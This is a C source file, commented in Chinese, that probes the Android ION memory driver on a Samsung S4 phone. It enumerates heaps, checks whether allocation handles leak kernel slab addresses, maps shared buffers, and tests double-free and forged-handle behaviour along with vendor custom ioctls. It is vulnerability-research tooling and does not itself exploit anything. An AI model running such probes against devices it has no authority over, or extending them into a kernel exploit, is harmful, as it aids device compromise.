/*
 * ion_probe.c —— S4 (3.4.5) ION 可达性矩阵实测探针（只读探测，不破坏现场）
 *
 * 目的（对应 P4.67）：
 *   1. 逐 heap id 爆力探测哪些 heap 对本进程开放（ion_open 用 heap_mask=-1，
 *      即 "user" client 全开 —— 源码 ion.c:1351）
 *   2. 观察 ION_IOC_ALLOC 返回的 handle 值：它是内核 slab 指针，直接 copy_to_user
 *      → 用户态可读内核地址（infoleak）
 *   3. SHARE → fd，mmap 读内容（确认用户态可用）
 *   4. IMPORT 回 handle，验证 handle 引用计数路径
 *   5. CUSTOM 探测三星私有 ioctl 面（cmd 0..8）
 *
 * 判据：每一步都打印 errno，不做任何假设。
 * 编译：arm-none-linux-gnueabihf-gcc -static -O2 -o ion_probe ion_probe.c
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdint.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

#define ION_IOC_MAGIC 'I'

struct ion_handle;
struct ion_allocation_data {
	size_t len;
	size_t align;
	unsigned int heap_mask;
	unsigned int flags;
	struct ion_handle *handle;
};
struct ion_fd_data {
	struct ion_handle *handle;
	int fd;
};
struct ion_handle_data {
	struct ion_handle *handle;
};
struct ion_custom_data {
	unsigned int cmd;
	unsigned long arg;
};

#define ION_IOC_ALLOC	_IOWR(ION_IOC_MAGIC, 0, struct ion_allocation_data)
#define ION_IOC_FREE	_IOWR(ION_IOC_MAGIC, 1, struct ion_handle_data)
#define ION_IOC_SHARE	_IOWR(ION_IOC_MAGIC, 4, struct ion_fd_data)
#define ION_IOC_IMPORT	_IOWR(ION_IOC_MAGIC, 5, struct ion_fd_data)
#define ION_IOC_SYNC	_IOWR(ION_IOC_MAGIC, 7, struct ion_fd_data)
#define ION_IOC_CUSTOM	_IOWR(ION_IOC_MAGIC, 6, struct ion_custom_data)

static int fd_ion;

static int do_alloc(unsigned int hid, struct ion_handle **out)
{
	struct ion_allocation_data d;

	memset(&d, 0, sizeof d);
	d.len = 4096;
	d.align = 0;
	d.heap_mask = 1u << hid;
	d.flags = 0;
	d.handle = NULL;
	if (ioctl(fd_ion, ION_IOC_ALLOC, &d) != 0)
		return -errno;
	*out = d.handle;
	return 0;
}

int main(void)
{
	struct ion_handle *h = NULL;
	struct ion_handle *h2 = NULL;
	int i, ret, heap = -1;
	unsigned int handle_val;

	setvbuf(stdout, NULL, _IONBF, 0);
	printf("=== ION probe on S4 ===\n");

	fd_ion = open("/dev/ion", O_RDWR);
	if (fd_ion < 0) {
		printf("[!] open /dev/ion: %s\n", strerror(errno));
		return 1;
	}
	printf("[0] open /dev/ion ok, fd=%d\n", fd_ion);

	/* 1. 逐 heap id 探测 */
	printf("\n[1] heap id 探测（len=4096, heap_mask=1<<id）:\n");
	for (i = 0; i < 16; i++) {
		struct ion_handle *tmp = NULL;
		struct ion_handle_data hd;

		ret = do_alloc(i, &tmp);
		if (ret == 0) {
			printf("    id=%2d  ALLOC OK   handle=%p  (0x%08x)\n",
			       i, (void *)tmp, (unsigned int)(uintptr_t)tmp);
			if (heap < 0) {
				heap = i;
				h = tmp;
			} else {
				hd.handle = tmp;
				ioctl(fd_ion, ION_IOC_FREE, &hd);
			}
		} else if (ret == -EINVAL) {
			printf("    id=%2d  EINVAL（无此 heap 或类型不匹配）\n", i);
		} else {
			printf("    id=%2d  err=%d (%s)\n", i, -ret, strerror(-ret));
		}
	}

	if (heap < 0) {
		printf("[!] 没有任何 heap 可 alloc，后续跳过\n");
		return 2;
	}
	printf("\n    选用 heap id=%d, handle=%p\n", heap, (void *)h);

	handle_val = (unsigned int)(uintptr_t)h;
	printf("[2] handle 值 %#x —— 若为 0xc~0xe 段则确认内核 slab 地址泄漏\n", handle_val);

	/* 3. SHARE 拿 fd */
	{
		struct ion_fd_data fd_data;

		memset(&fd_data, 0, sizeof fd_data);
		fd_data.handle = h;
		if (ioctl(fd_ion, ION_IOC_SHARE, &fd_data) != 0) {
			printf("[3] SHARE fail: %s\n", strerror(errno));
		} else {
			void *p;
			printf("[3] SHARE ok, dmabuf fd=%d\n", fd_data.fd);
			p = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED,
				 fd_data.fd, 0);
			if (p == MAP_FAILED) {
				printf("     mmap fail: %s\n", strerror(errno));
			} else {
				*(volatile unsigned int *)p = 0x41424344;
				printf("     mmap ok @%p, write+read %#x\n",
				       p, *(volatile unsigned int *)p);
				munmap(p, 4096);
			}

			/* 4. IMPORT 回 handle（重新取一个 fd，避免上一步已关闭） */
			{
				struct ion_fd_data imp;
				int sharefd;

				memset(&imp, 0, sizeof imp);
				imp.handle = h;
				if (ioctl(fd_ion, ION_IOC_SHARE, &imp) == 0) {
					sharefd = imp.fd;
					memset(&imp, 0, sizeof imp);
					imp.fd = sharefd;
					if (ioctl(fd_ion, ION_IOC_IMPORT, &imp) == 0) {
						printf("[4] IMPORT ok, handle=%p\n",
						       (void *)imp.handle);
						h2 = imp.handle;
					} else {
						printf("[4] IMPORT fail: %s\n",
						       strerror(errno));
					}
					close(sharefd);
				}
			}
		}
	}

	/* 5. SYNC 探测（传 fd，看是否走 dma_buf 路径） */
	{
		struct ion_fd_data sd;
		memset(&sd, 0, sizeof sd);
		sd.handle = h;
		if (ioctl(fd_ion, ION_IOC_SHARE, &sd) == 0) {
			struct ion_fd_data s2;
			memset(&s2, 0, sizeof s2);
			s2.fd = sd.fd;
			ret = ioctl(fd_ion, ION_IOC_SYNC, &s2);
			printf("[5] SYNC(fd=%d) -> %d (%s)\n", sd.fd, ret,
			       ret ? strerror(errno) : "ok");
			close(sd.fd);
		}
	}

	/* 6. CUSTOM 探测 */
	printf("\n[6] CUSTOM ioctl 探测（cmd 0..8, arg=0）:\n");
	{
		int any = 0;
		for (i = 0; i < 9; i++) {
			struct ion_custom_data cd;
			cd.cmd = (unsigned int)i;
			cd.arg = 0;
			errno = 0;
			ret = ioctl(fd_ion, ION_IOC_CUSTOM, &cd);
			if (ret == 0 || (ret < 0 && errno != ENOTTY && errno != EINVAL)) {
				printf("    cmd=%d -> %d errno=%d (%s)  <<< 有实现\n",
				       i, ret, errno, strerror(errno));
				any = 1;
			}
		}
		if (!any)
			printf("    cmd 0..8 全部 ENOTTY/EINVAL ⇒ dev->custom_ioctl 为空\n");
	}

	/* 7. FREE */
	if (h2) {
		struct ion_handle_data hd;
		hd.handle = h2;
		printf("\n[7] FREE(imported) -> %d (%s)\n",
		       ioctl(fd_ion, ION_IOC_FREE, &hd), strerror(errno));
	}
	{
		struct ion_handle_data hd;
		hd.handle = h;
		printf("[7] FREE(orig) -> %d (%s)\n",
		       ioctl(fd_ion, ION_IOC_FREE, &hd), strerror(errno));
	}

	/* 8. double free 探测（validate 应在第二道拦住，不该 panic） */
	{
		struct ion_handle_data hd;
		hd.handle = h;
		errno = 0;
		ret = ioctl(fd_ion, ION_IOC_FREE, &hd);
		printf("[8] FREE 二次 -> %d errno=%d (%s)\n", ret, errno,
		       strerror(errno));
	}

	/* 9. 伪造 handle 探测（validate 用指针比较，应拒绝；不该 panic） */
	{
		struct ion_handle_data hd;
		hd.handle = (struct ion_handle *)0x41414141;
		errno = 0;
		ret = ioctl(fd_ion, ION_IOC_FREE, &hd);
		printf("[9] FREE 伪造 0x41414141 -> %d errno=%d (%s)\n", ret, errno,
		       strerror(errno));
	}

	close(fd_ion);
	printf("=== done ===\n");
	return 0;
}
